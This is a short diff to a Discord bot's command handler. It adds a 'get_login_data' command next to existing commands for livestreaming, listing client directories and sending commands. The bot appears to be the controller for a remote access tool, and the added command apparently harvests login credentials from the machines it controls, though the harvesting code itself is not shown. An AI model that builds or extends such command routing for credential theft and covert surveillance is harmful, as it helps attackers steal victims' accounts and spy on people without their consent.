@@ -11,7 +11,8 @@ import {
     handleListDirectoriesClientCommand,
     handleLivestreamCommand,
     handleStopLivestreamCommand,
-    handleSendCommand
+    handleSendCommand,
+    handleGetLoginDataCommand
 } from "./utils/handleCommands.js";
 
 const {TOKEN, API_BASE_URL} = config;
@@ -47,6 +48,9 @@ client.on('interactionCreate', async interaction => {
                 break;
             case 'list_directories_client':
                 await handleListDirectoriesClientCommand(interaction);
+                break;
+            case 'get_login_data':
+                await handleGetLoginDataCommand(interaction);
                 break;
         }
     } else if (interaction.isButton()) {
